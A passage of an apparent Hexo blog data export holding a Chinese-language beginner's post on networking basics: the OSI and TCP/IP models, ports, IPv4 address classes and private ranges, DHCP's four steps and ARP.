这个就是**表示层**的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个**会话连接** 会话层会在信息发过去的时候**保证传输**顺利进行 传输层会把数据**分成**适合传输的**数据包**进行传输 网络层会规划一条**合适的路径**传输信息 数据链路层会通过物理网络将**数据包传给**物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息\n\n## tcp/ip模型\n- 应用层\n- 传输层\n- 网络接口层\n- 链路层\n\n\n## 端口\n\n一个是物理端口 一个是逻辑端口\n\n物理端口是用于连接物理设备之间的接口，如ADSL Modem、集线器、交换机、路由器上用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。\n\n逻辑端口是指逻辑意义上用于区分服务的端口，比如用于浏览网页服务的80端口，用于FTP服务的21端口等。如TCP/IP协议中的服务端口，通过不同的逻辑端口来区分不同的服务。\n\n最多可以有65536个端口 。端口是通过端口号来标记的，端口号只有整数，范围是从0 到65535 。\n\n说白了 端口可以简单理解为门牌号 特定服务或者特定应用的门牌号 外界互联网来的消息，数据包可以通过端口到达指定的应用或者服务\n\n### 周知端口\n0-1023 周知端口\n\n### 动态端口\n1024-65535 动态端口\n\n## ip地址\n由网络号和主机号组成\n\nA类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255\n\nB类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255\n\nC类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255\n\nD类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）\n\nE类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。\n\n0.0.0.0用来寻找自己的ip\n\n\n### 私有地址\n- A类 10.0.0.0 - 10.255.255.255 (10/8)\n- B类 172.16.0.0 - 172.31.255.255 (172.16/12)\n- C类 192.168.0.0 - 192.168.255.255 (192.168/16)\n\n\n\n## dhcp协议\n\n动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。\n\n\n### DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\n\n- DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。\n- DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。\n- DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。\n- DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。\n\n\n## arp协议\narp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址\n\n目标 MAC 地址\n源 MAC 地址\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/network-网络概念.md","raw":"---\ntitle: network 网络概念\ndate: 2025-01-31 18:20:52\ntags: web 网络\ntop_img: transparent\n---\n\n# 网络知识的介绍\n\n\n## osi七层模型\nOSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。\n\n分为：\n- 物理层\n- 数据链路层\n- 网络层\n- 传输层\n- 会话层\n- 表示层\n- 应用层\n\n\n![osi](/images/network-网络概念/osi.png)\n\n\n### 物理层\n\n**物理层**（Physical Layer）是计算机网络OSI模型中**最低**的一层，也是**最基本**的一层。简单的说，网络的物理层面确保**原始的数据**可在各种**物理媒体**上**传输**。\n\n物理层规定：为传输数据，需要**物理链路**与**设备**的建立、维持、拆除，并具有**机械的**、**电子的**、**功能的**、**规范**的特性。\n\n第一层的数据单元是**比特**（bit）。\n\n#### 功能\n1. 为数据段设备提供传输数据的通路\n\n2. 传输数据\n\n#### 常见物理层设备\n- 光纤\n- CAT-5线\n- CAT-6线\n- CAT-7线\n- RJ-45接头\n- 集线器\n- 串口\n- 并口\n\n#### 编码\n- 曼彻斯特编码 \n- 差分曼彻斯特编码\n\n### 数据链路层\n数据链路层（Data Link Layer）是OSI参考模型**第二层**，位于物理层与网络层之间。可以细分成**介质访问控制（MAC）子层**和**逻辑链路控制（LLC）子层**。\n\n#### 主要功能\n数据链路层用于跨物理层在**网段节点**之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了**差错检测**用于**纠正**物理层中发生的错误。\n\n只提供导线的一端到另一端（本质是点到点）的**数据传输**。\n\n数据链路层的以太网协议规定了一组二进制电信号为**数据帧**，数据帧的报头 head 就包含**目标 MAC 地址**和**源 MAC 地址**\n\n第二层的数据单元是 **帧**（frame）。\n\n帧都包括一个帧头 主题和一个帧尾\n\n- 帧头：源节点和目的节点的mac地址\n- 主体：要传输的比特\n- 帧尾：包括错误检测信息\n\n#### 常见数据链路层的设备\n- 网卡（物理层和数据链路层的MAC子层）\n- 交换机 是数据链路层设备。\n- 桥接器（又称网桥）\n\n#### 协议\n异步传输模式\n- VLAN（IEEE 802.1Q）\n- 以太网（IEEE 802.3）\n- Wi-Fi（IEEE 802.11）\n\n- PPP协议\n点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式\n\n- PPPoE协议\n，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。\n\n### 网络层\n实际的传输功能就在网络层\n\n网络层是**互联网通信过程**的一部分，这是连接发生的地方，在不同网络之间来回**发送数据包**来进行通信，处理不同网络之间的数据路由和发送。\n\n用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。\n\n第三层的数据单元为**数据包**\n\n#### 功能\n1. 寻址\n对网络层而言使用IP地址来**唯一标识**互联网上的各个寻址，网络层依靠IP地址进行**相互通信**（类似于MAC地址），详细的编址方案参见IPv4和IPv6。\n<br>\n2. 路由\n在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。\n\n#### 网络层协议\n- IP （V4、V6）\n- ICMP（V4、V6）\n- IPsec\n- RIP\n- OSPF\n\n#### ip协议\n网络层最常使用这个协议。IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（最大传输单元。以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。\n\n#### 组成\n- 主机号\n- 网络号\n\n#### 具有网络层功能的设备\n- 路由\n- 三层交换机\n\n### 传输层\n传输层并不负责将数据从一个设备传输到另一个设备 是作为数据传输的一个媒介 帮助应用到应用的通信\n\n传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。\n\n第四次的数据单元可以说**报文段**或**数据段**(**tcp**)和**数据报**(**udp**)\n\n#### 协议\n- tcp\n- udp\n\ntcp比udp多出很多特征 流量控制，超时重传等\n\n传输层的数据包超过tcp最大报文段长度，就要将数据包分段 称之为tcp segment(tcp段)\n\n### 会话层\n主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行**会话**（Session），而进行的对话连接的管理服务。\n\n#### 会话层服务\n- 认证\n- 权限\n- 会话恢复\n\n#### 会话层协议\n- PAP, 密码认证协议\n- PPTP, 点对点隧道协议\n- L2TP, 第二层隧道协议\n- RPC, 远程过程调用\n- SDP, 套接字直接协议\n\n### 表示层\n\n表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义\n\n表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。\n\n为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。\n\n#### 表示层的主要功能\n- 数据语法转换\n- 语法表示\n- 连接管理\n- 数据处理\n- 数据加密和解密\n- 数据压缩和解压\n- 数据编码和解码\n\n#### 表示层协议\n- HTTP/HTTPS\n- FTP/FTPS\n- SSH\n- Telnet\n- ASN.1\n\n### 应用层\n\n最上面的一层 应用层。电脑手机使用的应用程序就是在应用层实现的。应用层不关心数据的传输\n\n用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。\n\n应用层直接向最终用户应用程序提供网络服务。\n\n#### 协议\n- DHCP\n- DNS\n- FTP\n- POP3\n- http\n- ftp\n- smtp\n简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于**应用层** 将你发的这个信息转化为机器**能够懂的适合传输**的形式 这个就是**表示层**的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个**会话连接** 会话层会在信息发过去的时候**保证传输**顺利进行 传输层会把数据**分成**适合传输的**数据包**进行传输 网络层会规划一条**合适的路径**传输信息 数据链路层会通过物理网络将**数据包传给**物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息\n\n## tcp/ip模型\n- 应用层\n- 传输层\n- 网络接口层\n- 链路层\n\n\n## 端口\n\n一个是物理端口 一个是逻辑端口\n\n物理端口是用于连接物理设备之间的接口，如ADSL Modem、集线器、交换机、路由器上用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。\n\n逻辑端口是指逻辑意义上用于区分服务的端口，比如用于浏览网页服务的80端口，用于FTP服务的21端口等。如TCP/IP协议中的服务端口，通过不同的逻辑端口来区分不同的服务。\n\n最多可以有65536个端口 。端口是通过端口号来标记的，端口号只有整数，范围是从0 到65535 。\n\n说白了 端口可以简单理解为门牌号 特定服务或者特定应用的门牌号 外界互联网来的消息，数据包可以通过端口到达指定的应用或者服务\n\n### 周知端口\n0-1023 周知端口\n\n### 动态端口\n1024-65535 动态端口\n\n## ip地址\n由网络号和主机号组成\n\nA类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255\n\nB类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255\n\nC类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255\n\nD类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）\n\nE类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。\n\n0.0.0.0用来寻找自己的ip\n\n\n### 私有地址\n- A类 10.0.0.0 - 10.255.255.255 (10/8)\n- B类 172.16.0.0 - 172.31.255.255 (172.16/12)\n- C类 192.168.0.0 - 192.168.255.255 (192.168/16)\n\n\n\n## dhcp协议\n\n动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。\n\n\n### DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\n\n- DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。\n- DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。\n- DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。\n- DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。\n\n\n## arp协议\narp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址\n\n目标 MAC 地址\n源 MAC 地址\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"network-网络概念","published":1,"updated":"2025-02-08T13:40:23.026Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxf000gtsg62av8f4vd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"网络知识的介绍\"><a href=\"#网络知识的介绍\" class=\"headerlink\" title=\"网络知识的介绍\"></a>网络知识的介绍</h1><h2 id=\"osi七层模型\"><a href=\"#osi七层模型\" class=\"headerlink\" title=\"osi七层模型\"></a>osi七层模型</h2><p>OSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。</p>\n<p>分为：</p>\n<ul>\n<li>物理层</li>\n<li>数据链路层</li>\n<li>网络层</li>\n<li>传输层</li>\n<li>会话层</li>\n<li>表示层</li>\n<li>应用层</li>\n</ul>\n<p><img src=\"/images/network-%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/osi.png\" alt=\"osi\"></p>\n<h3 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h3><p><strong>物理层</strong>（Physical Layer）是计算机网络OSI模型中<strong>最低</strong>的一层，也是<strong>最基本</strong>的一层。简单的说，网络的物理层面确保<strong>原始的数据</strong>可在各种<strong>物理媒体</strong>上<strong>传输</strong>。</p>\n<p>物理层规定：为传输数据，需要<strong>物理链路</strong>与<strong>设备</strong>的建立、维持、拆除，并具有<strong>机械的</strong>、<strong>电子的</strong>、<strong>功能的</strong>、<strong>规范</strong>的特性。</p>\n<p>第一层的数据单元是<strong>比特</strong>（bit）。</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li><p>为数据段设备提供传输数据的通路</p>\n</li>\n<li><p>传输数据</p>\n</li>\n</ol>\n<h4 id=\"常见物理层设备\"><a href=\"#常见物理层设备\" class=\"headerlink\" title=\"常见物理层设备\"></a>常见物理层设备</h4><ul>\n<li>光纤</li>\n<li>CAT-5线</li>\n<li>CAT-6线</li>\n<li>CAT-7线</li>\n<li>RJ-45接头</li>\n<li>集线器</li>\n<li>串口</li>\n<li>并口</li>\n</ul>\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><ul>\n<li>曼彻斯特编码 </li>\n<li>差分曼彻斯特编码</li>\n</ul>\n<h3 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h3><p>数据链路层（Data Link Layer）是OSI参考模型<strong>第二层</strong>，位于物理层与网络层之间。可以细分成<strong>介质访问控制（MAC）子层</strong>和<strong>逻辑链路控制（LLC）子层</strong>。</p>\n<h4 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h4><p>数据链路层用于跨物理层在<strong>网段节点</strong>之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了<strong>差错检测</strong>用于<strong>纠正</strong>物理层中发生的错误。</p>\n<p>只提供导线的一端到另一端（本质是点到点）的<strong>数据传输</strong>。</p>\n<p>数据链路层的以太网协议规定了一组二进制电信号为<strong>数据帧</strong>，数据帧的报头 head 就包含<strong>目标 MAC 地址</strong>和<strong>源 MAC 地址</strong></p>\n<p>第二层的数据单元是 <strong>帧</strong>（frame）。</p>\n<p>帧都包括一个帧头 主题和一个帧尾</p>\n<ul>\n<li>帧头：源节点和目的节点的mac地址</li>\n<li>主体：要传输的比特</li>\n<li>帧尾：包括错误检测信息</li>\n</ul>\n<h4 id=\"常见数据链路层的设备\"><a href=\"#常见数据链路层的设备\" class=\"headerlink\" title=\"常见数据链路层的设备\"></a>常见数据链路层的设备</h4><ul>\n<li>网卡（物理层和数据链路层的MAC子层）</li>\n<li>交换机 是数据链路层设备。</li>\n<li>桥接器（又称网桥）</li>\n</ul>\n<h4 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h4><p>异步传输模式</p>\n<ul>\n<li><p>VLAN（IEEE 802.1Q）</p>\n</li>\n<li><p>以太网（IEEE 802.3）</p>\n</li>\n<li><p>Wi-Fi（IEEE 802.11）</p>\n</li>\n<li><p>PPP协议<br>点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式</p>\n</li>\n<li><p>PPPoE协议<br>，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。</p>\n</li>\n</ul>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h3><p>实际的传输功能就在网络层</p>\n<p>网络层是<strong>互联网通信过程</strong>的一部分，这是连接发生的地方，在不同网络之间来回<strong>发送数据包</strong>来进行通信，处理不同网络之间的数据路由和发送。</p>\n<p>用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。</p>\n<p>第三层的数据单元为<strong>数据包</strong></p>\n<h4 id=\"功能-1\"><a href=\"#功能-1\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li>寻址<br>对网络层而言使用IP地址来<strong>唯一标识</strong>互联网上的各个寻址，网络层依靠IP地址进行<strong>相互通信</strong>（类似于MAC地址），详细的编址方案参见IPv4和IPv6。<br></li>\n<li>路由<br>在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。</li>\n</ol>\n<h4 id=\"网络层协议\"><a href=\"#网络层协议\" class=\"headerlink\" title=\"网络层协议\"></a>网络层协议</h4><ul>\n<li>IP （V4、V6）</li>\n<li>ICMP（V4、V6）</li>\n<li>IPsec</li>\n<li>RIP</li>\n<li>OSPF</li>\n</ul>\n<h4 id=\"ip协议\"><a href=\"#ip协议\" class=\"headerlink\" title=\"ip协议\"></a>ip协议</h4><p>网络层最常使用这个协议。IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（最大传输单元。以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。</p>\n<h4 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h4><ul>\n<li>主机号</li>\n<li>网络号</li>\n</ul>\n<h4 id=\"具有网络层功能的设备\"><a href=\"#具有网络层功能的设备\" class=\"headerlink\" title=\"具有网络层功能的设备\"></a>具有网络层功能的设备</h4><ul>\n<li>路由</li>\n<li>三层交换机</li>\n</ul>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>传输层并不负责将数据从一个设备传输到另一个设备 是作为数据传输的一个媒介 帮助应用到应用的通信</p>\n<p>传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。</p>\n<p>第四次的数据单元可以说<strong>报文段</strong>或<strong>数据段</strong>(<strong>tcp</strong>)和<strong>数据报</strong>(<strong>udp</strong>)</p>\n<h4 id=\"协议-1\"><a href=\"#协议-1\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>tcp</li>\n<li>udp</li>\n</ul>\n<p>tcp比udp多出很多特征 流量控制，超时重传等</p>\n<p>传输层的数据包超过tcp最大报文段长度，就要将数据包分段 称之为tcp segment(tcp段)</p>\n<h3 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h3><p>主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行<strong>会话</strong>（Session），而进行的对话连接的管理服务。</p>\n<h4 id=\"会话层服务\"><a href=\"#会话层服务\" class=\"headerlink\" title=\"会话层服务\"></a>会话层服务</h4><ul>\n<li>认证</li>\n<li>权限</li>\n<li>会话恢复</li>\n</ul>\n<h4 id=\"会话层协议\"><a href=\"#会话层协议\" class=\"headerlink\" title=\"会话层协议\"></a>会话层协议</h4><ul>\n<li>PAP, 密码认证协议</li>\n<li>PPTP, 点对点隧道协议</li>\n<li>L2TP, 第二层隧道协议</li>\n<li>RPC, 远程过程调用</li>\n<li>SDP, 套接字直接协议</li>\n</ul>\n<h3 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h3><p>表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义</p>\n<p>表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。</p>\n<p>为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。</p>\n<h4 id=\"表示层的主要功能\"><a href=\"#表示层的主要功能\" class=\"headerlink\" title=\"表示层的主要功能\"></a>表示层的主要功能</h4><ul>\n<li>数据语法转换</li>\n<li>语法表示</li>\n<li>连接管理</li>\n<li>数据处理</li>\n<li>数据加密和解密</li>\n<li>数据压缩和解压</li>\n<li>数据编码和解码</li>\n</ul>\n<h4 id=\"表示层协议\"><a href=\"#表示层协议\" class=\"headerlink\" title=\"表示层协议\"></a>表示层协议</h4><ul>\n<li>HTTP&#x2F;HTTPS</li>\n<li>FTP&#x2F;FTPS</li>\n<li>SSH</li>\n<li>Telnet</li>\n<li>ASN.1</li>\n</ul>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>最上面的一层 应用层。电脑手机使用的应用程序就是在应用层实现的。应用层不关心数据的传输</p>\n<p>用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。</p>\n<p>应用层直接向最终用户应用程序提供网络服务。</p>\n<h4 id=\"协议-2\"><a href=\"#协议-2\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>DHCP</li>\n<li>DNS</li>\n<li>FTP</li>\n<li>POP3</li>\n<li>http</li>\n<li>ftp</li>\n<li>smtp<br>简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于<strong>应用层</strong> 将你发的这个信息转化为机器<strong>能够懂的适合传输</strong>的形式 这个就是<strong>表示层</strong>的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个<strong>会话连接</strong> 会话层会在信息发过去的时候<strong>保证传输</strong>顺利进行 传输层会把数据<strong>分成</strong>适合传输的<strong>数据包</strong>进行传输 网络层会规划一条<strong>合适的路径</strong>传输信息 数据链路层会通过物理网络将<strong>数据包传给</strong>物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息</li>\n</ul>\n<h2 id=\"tcp-ip模型\"><a href=\"#tcp-ip模型\" class=\"headerlink\" title=\"tcp&#x2F;ip模型\"></a>tcp&#x2F;ip模型</h2><ul>\n<li>应用层</li>\n<li>传输层</li>\n<li>网络接口层</li>\n<li>链路层</li>\n</ul>\n<h2 id=\"端口\"><a href=\"#端口\" class=\"headerlink\" title=\"端口\"></a>端口</h2><p>一个是物理端口 一个是逻辑端口</p>\n<p>物理端口是用于连接物理设备之间的接口，如ADSL Modem、集线器、交换机、路由器上用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。</p>\n<p>逻辑端口是指逻辑意义上用于区分服务的端口，比如用于浏览网页服务的80端口，用于FTP服务的21端口等。如TCP&#x2F;IP协议中的服务端口，通过不同的逻辑端口来区分不同的服务。</p>\n<p>最多可以有65536个端口 。端口是通过端口号来标记的，端口号只有整数，范围是从0 到65535 。</p>\n<p>说白了 端口可以简单理解为门牌号 特定服务或者特定应用的门牌号 外界互联网来的消息，数据包可以通过端口到达指定的应用或者服务</p>\n<h3 id=\"周知端口\"><a href=\"#周知端口\" class=\"headerlink\" title=\"周知端口\"></a>周知端口</h3><p>0-1023 周知端口</p>\n<h3 id=\"动态端口\"><a href=\"#动态端口\" class=\"headerlink\" title=\"动态端口\"></a>动态端口</h3><p>1024-65535 动态端口</p>\n<h2 id=\"ip地址\"><a href=\"#ip地址\" class=\"headerlink\" title=\"ip地址\"></a>ip地址</h2><p>由网络号和主机号组成</p>\n<p>A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>\n<p>B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255</p>\n<p>C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255</p>\n<p>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）</p>\n<p>E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>\n<p>0.0.0.0用来寻找自己的ip</p>\n<h3 id=\"私有地址\"><a href=\"#私有地址\" class=\"headerlink\" title=\"私有地址\"></a>私有地址</h3><ul>\n<li>A类 10.0.0.0 - 10.255.255.255 (10&#x2F;8)</li>\n<li>B类 172.16.0.0 - 172.31.255.255 (172.16&#x2F;12)</li>\n<li>C类 192.168.0.0 - 192.168.255.255 (192.168&#x2F;16)</li>\n</ul>\n<h2 id=\"dhcp协议\"><a href=\"#dhcp协议\" class=\"headerlink\" title=\"dhcp协议\"></a>dhcp协议</h2><p>动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。</p>\n<h3 id=\"DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\"><a href=\"#DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\" class=\"headerlink\" title=\"DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\"></a>DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：</h3><ul>\n<li>DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。</li>\n<li>DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。</li>\n<li>DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。</li>\n<li>DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。</li>\n</ul>\n<h2 id=\"arp协议\"><a href=\"#arp协议\" class=\"headerlink\" title=\"arp协议\"></a>arp协议</h2><p>arp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址</p>\n<p>目标 MAC 地址<br>源 MAC 地址</p>\n","excerpt":"","more":"<h1 id=\"网络知识的介绍\"><a href=\"#网络知识的介绍\" class=\"headerlink\" title=\"网络知识的介绍\"></a>网络知识的介绍</h1><h2 id=\"osi七层模型\"><a href=\"#osi七层模型\" class=\"headerlink\" title=\"osi七层模型\"></a>osi七层模型</h2><p>OSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。</p>\n<p>分为：</p>\n<ul>\n<li>物理层</li>\n<li>数据链路层</li>\n<li>网络层</li>\n<li>传输层</li>\n<li>会话层</li>\n<li>表示层</li>\n<li>应用层</li>\n</ul>\n<p><img src=\"/images/network-%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/osi.png\" alt=\"osi\"></p>\n<h3 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h3><p><strong>物理层</strong>（Physical Layer）是计算机网络OSI模型中<strong>最低</strong>的一层，也是<strong>最基本</strong>的一层。简单的说，网络的物理层面确保<strong>原始的数据</strong>可在各种<strong>物理媒体</strong>上<strong>传输</strong>。</p>\n<p>物理层规定：为传输数据，需要<strong>物理链路</strong>与<strong>设备</strong>的建立、维持、拆除，并具有<strong>机械的</strong>、<strong>电子的</strong>、<strong>功能的</strong>、<strong>规范</strong>的特性。</p>\n<p>第一层的数据单元是<strong>比特</strong>（bit）。</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li><p>为数据段设备提供传输数据的通路</p>\n</li>\n<li><p>传输数据</p>\n</li>\n</ol>\n<h4 id=\"常见物理层设备\"><a href=\"#常见物理层设备\" class=\"headerlink\" title=\"常见物理层设备\"></a>常见物理层设备</h4><ul>\n<li>光纤</li>\n<li>CAT-5线</li>\n<li>CAT-6线</li>\n<li>CAT-7线</li>\n<li>RJ-45接头</li>\n<li>集线器</li>\n<li>串口</li>\n<li>并口</li>\n</ul>\n<h4 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h4><ul>\n<li>曼彻斯特编码 </li>\n<li>差分曼彻斯特编码</li>\n</ul>\n<h3 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h3><p>数据链路层（Data Link Layer）是OSI参考模型<strong>第二层</strong>，位于物理层与网络层之间。可以细分成<strong>介质访问控制（MAC）子层</strong>和<strong>逻辑链路控制（LLC）子层</strong>。</p>\n<h4 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h4><p>数据链路层用于跨物理层在<strong>网段节点</strong>之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了<strong>差错检测</strong>用于<strong>纠正</strong>物理层中发生的错误。</p>\n<p>只提供导线的一端到另一端（本质是点到点）的<strong>数据传输</strong>。</p>\n<p>数据链路层的以太网协议规定了一组二进制电信号为<strong>数据帧</strong>，数据帧的报头 head 就包含<strong>目标 MAC 地址</strong>和<strong>源 MAC 地址</strong></p>\n<p>第二层的数据单元是 <strong>帧</strong>（frame）。</p>\n<p>帧都包括一个帧头 主题和一个帧尾</p>\n<ul>\n<li>帧头：源节点和目的节点的mac地址</li>\n<li>主体：要传输的比特</li>\n<li>帧尾：包括错误检测信息</li>\n</ul>\n<h4 id=\"常见数据链路层的设备\"><a href=\"#常见数据链路层的设备\" class=\"headerlink\" title=\"常见数据链路层的设备\"></a>常见数据链路层的设备</h4><ul>\n<li>网卡（物理层和数据链路层的MAC子层）</li>\n<li>交换机 是数据链路层设备。</li>\n<li>桥接器（又称网桥）</li>\n</ul>\n<h4 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h4><p>异步传输模式</p>\n<ul>\n<li><p>VLAN（IEEE 802.1Q）</p>\n</li>\n<li><p>以太网（IEEE 802.3）</p>\n</li>\n<li><p>Wi-Fi（IEEE 802.11）</p>\n</li>\n<li><p>PPP协议<br>点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式</p>\n</li>\n<li><p>PPPoE协议<br>，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。</p>\n</li>\n</ul>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" 